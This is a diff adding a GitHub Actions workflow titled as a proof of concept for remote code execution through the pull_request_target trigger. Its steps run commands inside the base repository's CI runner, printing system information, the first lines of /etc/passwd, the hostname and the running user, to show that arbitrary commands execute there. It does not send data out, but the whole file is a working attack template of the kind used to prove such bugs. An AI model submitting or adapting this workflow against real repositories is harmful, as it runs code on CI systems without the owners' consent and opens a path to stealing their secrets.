@@ -1,0 +1,30 @@
+name: PoC – RCE via pull_request_target
+
+on:
+  pull_request_target:
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Show trigger context
+        run: |
+          echo "Triggered by: $GITHUB_EVENT_NAME"
+          echo "Running in repo: $GITHUB_REPOSITORY"
+          echo "Actor: $GITHUB_ACTOR"
+
+      - name: Proof of RCE – System Info
+        run: |
+          echo "[*] Running arbitrary commands inside base repo CI"
+          echo "--- date ---"
+          date
+          echo "--- uname -a ---"
+          uname -a
+          echo "--- /etc/passwd (first 5 lines) ---"
+          head -n 5 /etc/passwd
+
+      - name: Proof of Environment Access
+        run: |
+          echo "[*] Current working directory: $(pwd)"
+          echo "[*] Runner hostname: $(hostname)"
+          echo "[*] Whoami: $(whoami)"
